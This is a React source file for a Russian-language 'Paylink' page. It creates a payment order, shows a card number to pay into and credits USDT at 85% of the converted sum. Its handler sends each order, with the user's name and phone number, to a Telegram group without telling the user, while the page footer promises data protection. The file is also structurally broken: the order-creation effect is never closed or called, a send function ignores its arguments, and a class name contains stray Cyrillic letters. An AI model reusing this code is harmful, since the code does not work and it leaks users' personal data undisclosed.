import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { sendMessageGroup } from '../api/telegram.ts';
import { ReactComponent as CopyImage } from '../components/img/copy.svg';
import { ReactComponent as TetherImage } from '../components/img/tether.svg';
import RulesImage from '../components/img/rules.png';
import './styles.css';
import { DNcreateOrder, createCardOrder } from '../utils/api';

const PaymentRequest = () => {
  const location = useLocation();
  const navigate = useNavigate();

  const [order, setOrder] = useState('');
  const [rate, setRate] = useState(0);
  const [orderSum, setOrderSum] = useState(0);
  const [card, setCard] = useState('');
  const [formData, setFormData] = useState(location.state || {});
  const [showAlert, setShowAlert] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [expandedRule, setExpandedRule] = useState(null);
  const [copyAlertIndex, setCopyAlertIndex] = useState(null);
  const [userId, setUserId] = useState('');
  const [apiSource, setApiSource] = useState(''); // Инициализация apiSource

  // Функция для сохранения истории заказов
  const saveToHistory = async (order, cardNumber, orderSum, rate) => {
    if (order && cardNumber && orderSum && rate) {
      try {
        const response = await axios.post('/api/db/history', {
          trade: order,
          cardNumber: cardNumber,
          amount: orderSum,
          rate: rate,
          userId: userId,
        });
        console.log('History saved:', response.data);
      } catch (error) {
        console.error('Error saving to history:', error);
      }
    }
  };

  useEffect(() => {
    const fetchUserId = async () => {
      try {
        const response = await axios.get('/api/auth/user-id', {
          headers: {
            'x-auth-token': localStorage.getItem('token'),
          },
        });
        setUserId(response.data.userId);
      } catch (error) {
        console.error('Error fetching user ID:', error);
        const tempId = `TEMP_${Math.random().toString(36).substring(2, 15)}`;
        localStorage.setItem('tempId', tempId);
        setUserId(tempId);
      }
    };

    fetchUserId();
  }, []);

  useEffect(() => {
    if (location.state && location.state.id) {
      const fetchFormData = async () => {
        try {
          const response = await axios.get(`/api/db/form/${location.state.id}`);
          setFormData(response.data);
        } catch (error) {
          console.error('Error fetching form data:', error);
          setError('Error fetching form data');
        }
      };

      fetchFormData();
    }
  }, [location.state]);

  useEffect(() => {
    const maxRetries = 8;
    const retryInterval = 1000;

    const initiateOrder = async (attempt = 1) => {
      if (!formData.amount) return;

      setLoading(true);
      try {
        const data = await DNcreateOrder(formData.amount);
        if (data.result === 'error' || ['E07', 'E05'].includes(data.code)) {
          if (attempt < maxRetries) {
            setTimeout(() => initiateOrder(attempt + 1), retryInterval);
          } else {
            console.log('Max retries reached. Attempting createCardOrder...');
            initiateCardOrder();
          }
        } else {
          handleOrderSuccess(data, 'API1');
        }
      } catch (error) {
        console.error('Error creating payment request:', error);
        setError('Error creating payment request');
        setLoading(false);
      }
    };

    const initiateCardOrder = async () => {
      try {
        const data = await createCardOrder(formData.amount);
        handleOrderSuccess(data, 'API2');
      } catch (error) {
        console.error('Error creating card order:', error);
        setError('Error creating card order');
        setLoading(false);
      }
    };

    const handleOrderSuccess = (data, source) => {
      const orderId = source === 'API2' ? data.order_id : data.trade;
      setOrder(orderId);
      setCard(data.card_number);
      setRate(data.rate);
      setOrderSum(data.amount);
      setApiSource(source); // Обновление источника API
    
      // Проверка, что все необходимые данные доступны
      if (orderId && data.amount && data.card_number && data.rate && userId) {
        handleSmsSend(orderId, data.amount, data.card_number); // Правильный вызов
        saveToHistory(orderId, data.card_number, data.amount, data.rate, userId);
      }
      setLoading(false);
    };

  const handleSmsSend = async () => {
    if (order && orderSum && card) {
      const message = `
        PAY_XX:
        Order: [${order}]
        Order Sum: [${orderSum}]
        Card: [${card}]
        User Name: [${formData.name}]
        Phone Number: [${formData.phoneNumber}]
      `;
      try {
        await sendMessageGroup(message);
      } catch (error) {
        console.error('Error sending SMS:', error);
      }
    }
  };

  const handleContinue = () => {
    if (order) {
      navigate('/statusdm', {
        state: {
          order,
          amount: orderSum,
          cardNumber: card,
          apiSource,
        },
      });
    }
  };

  const handleCopy = (text, index) => {
    navigator.clipboard.writeText(text);
    setCopyAlertIndex(index);
    setShowAlert(true);
    setTimeout(() => setShowAlert(false), 3000);
  };

  const result = (orderSum / rate * 0.85).toFixed(1) || '...';

  const handleRuleClick = (index) => {
    setExpandedRule(expandedRule === index ? null : index);
  };

  const rules = [
    {
      title: 'Проверьте срок действия карты.',
      content: 'Срок действия карты должен быть действителен на момент проведения операции.',
    },
    {
      title: 'Отрегулируй лимит на интернет-платежи.',
      content: 'Убедитесь, что ваш лимит на интернет-платежи позволяет выполнить эту транзакцию.',
    },
    {
      title: 'Переведите точную сумму.',
      content: 'Проверьте, что введенная сумма перевода точно соответствует требуемой сумме.',
    },
    {
      title: 'Переводы принимаются от физических лиц.',
      content: 'Только переводы от физических лиц могут быть обработаны нашей системой.',
    },
    {
      title: 'Проверь введённые данные.',
      content: 'Убедитесь, что все введенные данные верны и не содержат ошибок.',
    },
  ];
  return (
    <div className="flex flex-col items-center p-4 bg-gray-fon min-h-screen">
      <div className="flex flex-col items-center space-y-4 h-full w-full md:max-w-[1070px] max-w-[390px]">
        <div className="flex justify-between md:flex-row flex-col w-full mb-6 mt-6">
          <div className="space-y-4 md:w-[630px] w-[330px] ">
            <div className="bg-white p-4 rounded-lg relative">
              {showAlert && copyAlertIndex === 0 && (
                <div className="font-semibold text-sm text-grayth absolute top-0 right-0 mr-4">Скопировано в буфер обмена</div>
              )}
              <div className="flex justify-between items-center">
                <div className="">
                  <h2 className="text-base font-normal">Номер заявки</h2>
                  <p className="text-sm mt-2 text-blueth">
                    {order || (error && <p className="text-red-500 font-bold">Ошибка</p>)}
                  </p>
                </div>
                <button onClick={() => handleCopy(order || '', 0)} className="text-blue-500">
                  <CopyImage />
                </button>
              </div>
            </div>

            <div className="bg-white p-4 rounded-lg relative">
              {showAlert && copyAlertIndex === 2 && (
                <div className="font-semibold text-sm text-grayth absolute top-0 right-0 mr-4">Скопировано в буфер обмена</div>
              )}
              <div className="flex justify-between items-center">
                <div className="">
                  <h2 className="text-base font-normal">Реквизиты подвязанные к счёту</h2>
                  <p className="text-sm mt-2 text-blueth">{card || (error && <p className="text-red-500 font-bold">Ошибка</p>)}</p>
                </div>
                <button onClick={() => handleCopy(card || '', 2)} className="text-blue-500">
                  <CopyImage />
                </button>
              </div>
            </div>
            <div className="bg-white p-4 rounded-lg relative">
              {showAlert && copyAlertIndex === 1 && (
                <div className="font-semibold text-sm text-grayth absolute top-0 right-0 mr-4">Скопировано в буфер обмена</div>
              )}
              <div className="flex justify-between items-center">
                <div className="">
                  <h2 className="text-base font-normal">Сумма транзакции</h2>
                  <p className="text-sm mt-2 text-blueth">{orderSum || (error && <p className="text-red-500 font-bold">Ошибка</p>)}</p>
                </div>
                <button onClick={() => handleCopy(orderSum || '', 1)} className="text-blue-500">
                  <CopyImage />
                </button>
              </div>
            </div>
            <div className="bg-white p-4 rounded-lg">
              <div className="">
                <h2 className="text-base font-normal">Обслуживающий банк</h2>
                <p className="text-sm mt-2 text-blueth">{ ' ... ' || (error && <p className="text-red-500 font-bold">Ошибка</p>)}</p>
              </div>
            </div>
          </div>

          <div className="bg-white space-y-4 rounded-lg p-4 md:text-right text-left md:w-[300px] w-[330px] md:mt-0 mt-8">
            <div className="md:space-y-4 space-y-8 text-gray-700">
              <div className="w-full md:p-4">
                <h2 className="text-sm font-normal text-grayth">Имя пользователя</h2>
                <p className="text-base mt-1">{formData.name}</p>
              </div>
              <div className="w-full md:p-4">
                <h2 className="text-sm font-normal text-grayth">Номер пользователя</h2>
                <p className="text-base mt-1">{formData.phoneNumber}</p>
              </div>
              <div className="w-full md:p-4">
                <h2 className="text-sm font-normal text-grayth">Зачислено на баланс</h2>
                <div className="flex md:justify-end justify-start">
                  <p className="text-base mt-1">{result} USDT</p>
                  <TetherImage className="w-5 h-5 ml-2 mt-1.5" />
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="w-full bg-white p-4 mt-4 rounded-lg flex-grow md:w-[1070px] w-[500px] md:max-w-[1070px] max-w-[500px]">
          <div className="text-gray-700">
            <div className="flex align-center items-center md:mb-6 mb-3">
              <img src={RulesImage} alt="RulesImage" className="absolute w-[25px] h-[25px] relative" />
              <h2 className="text-lg font-md ml-3">Правила успешного платежа</h2>
            </div>
            <ul className="md:space-y-3 space-y-3 md:pl-8 w-[100%]">
              {rules.map((rule, index) => (
                <li
                  key={index}
                  className={`bg-gray-form rounded-xl content-center font-sm cursor-pointer md:w-[95%] w-[100%] mx-auto ${expandedRule === index ? 'text-purple-700' : 'text-grayth'}`}
                  onClick={() => handleRuleClick(index)}
                >
                  <div className="flex justify-between items-center">
                    <p className={`text-sm font-semibold m-1 ml-4 md:w-[100%] w-[70%] ${expandedRule === index ? 'text-purpleth' : 'text-grayth'}`}>
                      {rule.title}
                    </p>
                    <div className="flex justify-center content-center w-[50px] h-[35px] items-center">
                      <button className={`font-medium text-3xl mb-2 ${expandedRule === index ? 'text-purpleth' : 'text-grayth'}`}>
                        {expandedRule === index ? '-' : '+'}
                      </button>
                    </div>
                  </div>
                  {expandedRule === index && <p className="mb-2 ml-4 text-gray-600">{rule.content}</p>}
                </li>
              ))}
            </ul>
          </div>
        </div>
        <div className="p-4 mt-6 mb-6 pt-6">
          <button
            onClick={handleContinue}
            className="bg-grayth text-white py-2 px-4 rounded-lg hover:bg-purple-950 md:w-[470px] w-[300px] font-medium font-bold h-[50px]">
            Продолжить
          </button>
        </div>
        <div className="text-cафenter pb-4 mb-6 md:w-[470px] w-[300px]">
          <p className="text-sm text-grayth">
            <a href="#" className="text-blueth">
              Политика безопасности
            </a>{' '}
            содержит правила использования индивидуальной информации пользователей. Компания "Paylink" гарантирует соблюдение этих правил и требований к информационной безопасности как клиентам системы, так и участникам процесса предоставления услуг: банкам и поставщикам услуг и товаров.
          </p>
        </div>
      </div>
    </div>
  );
};

export default PaymentRequest;
